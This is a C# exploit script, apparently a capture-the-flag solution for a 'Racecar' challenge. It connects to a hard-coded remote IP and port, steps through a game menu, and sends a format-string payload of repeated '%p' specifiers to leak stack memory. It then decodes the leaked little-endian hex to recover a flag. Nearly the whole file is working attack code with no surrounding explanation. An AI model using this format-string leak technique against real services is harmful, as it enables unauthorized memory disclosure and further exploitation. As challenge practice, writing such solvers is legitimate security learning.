using System.Net.Sockets;
using System.Text;

namespace RacecarExploit
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                string ip = "94.237.62.149";
                int port = 39108;

                using (TcpClient client = new TcpClient(ip, port))
                {
                    NetworkStream stream = client.GetStream();
                    byte[] buffer = new byte[4098];
                    int bytesRead;

                    // Receber dados iniciais
                    bytesRead = stream.Read(buffer, 0, buffer.Length);
                    string initialResponse = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    Console.WriteLine($"Initial response: {initialResponse}");

                    // Enviar nome "a" e aguardar resposta
                    stream.Write(Encoding.UTF8.GetBytes("a\n"));
                    bytesRead = stream.Read(buffer, 0, buffer.Length);
                    string nameResponse = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    Console.WriteLine($"Name response: {nameResponse}");

                    // Enviar nickname "aa" e aguardar resposta
                    stream.Write(Encoding.UTF8.GetBytes("aa\n"));
                    bytesRead = stream.Read(buffer, 0, buffer.Length);
                    string nicknameResponse = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    Console.WriteLine($"Nickname response: {nicknameResponse}");

                    // Selecionar "2" e aguardar resposta
                    stream.Write(Encoding.UTF8.GetBytes("2\n"));
                    bytesRead = stream.Read(buffer, 0, buffer.Length);
                    string selection2Response = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    Console.WriteLine($"Selection 2 response: {selection2Response}");

                    // Selecionar "2" e aguardar resposta
                    stream.Write(Encoding.UTF8.GetBytes("2\n"));
                    bytesRead = stream.Read(buffer, 0, buffer.Length);
                    string selection2CarResponse = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    Console.WriteLine($"Selection 2 car response: {selection2CarResponse}");

                    // Selecionar "1" e aguardar resposta
                    stream.Write(Encoding.UTF8.GetBytes("1\n"));
                    bytesRead = stream.Read(buffer, 0, buffer.Length);
                    string selection1CircuitResponse = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    Console.WriteLine($"Selection 1 circuit response: {selection1CircuitResponse}");

                    // Receber resultado da corrida
                    bytesRead = stream.Read(buffer, 0, buffer.Length);
                    string raceResults = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    Console.WriteLine($"Selection 1 circuit response: {raceResults}");

                    // Enviar payload e aguardar resposta
                    string payload = "%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p";
                    stream.Write(Encoding.UTF8.GetBytes(payload + "\n"));
                    bytesRead = stream.Read(buffer, 0, buffer.Length);
                    string flagHexResponse = Encoding.UTF8.GetString(buffer, 0, bytesRead);

                    // Extrair flag hex
                    string[] responseLines = flagHexResponse.Split('\n');
                    string flagHex = responseLines[2].Trim();

                    Console.WriteLine($"Flag encoded: {flagHex}");

                    // Decodificar flag
                    string flag = DecodeFlag(flagHexResponse);
                    Console.WriteLine($"Flag: {flag}");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"Exception: {e.Message}");
            }
        }

        static string DecodeFlag(string flagHexResponse)
        {
            string[] hexValues = flagHexResponse.Split(' ');
            StringBuilder realFlag = new StringBuilder();
            foreach (string hex in hexValues)
            {
                if (!string.IsNullOrEmpty(hex) && hex.StartsWith("0x"))
                {
                    string byteString = hex.Substring(2); // Remove '0x'
                    try
                    {
                        byte[] bytes = new byte[byteString.Length / 2];
                        for (int i = 0; i < bytes.Length; i++)
                        {
                            bytes[i] = Convert.ToByte(byteString.Substring(i * 2, 2), 16);
                        }
                        realFlag.Append(InvertString(Encoding.UTF8.GetString(bytes)));
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Erro ao decodificar hex '{hex}': {ex.Message}");
                    }
                }
            }
            return realFlag.ToString();
        }

        public static string InvertString(string str)
        {
            char[] charArray = str.ToCharArray();
            Array.Reverse(charArray);
            return new string(charArray);
        }
    }
}

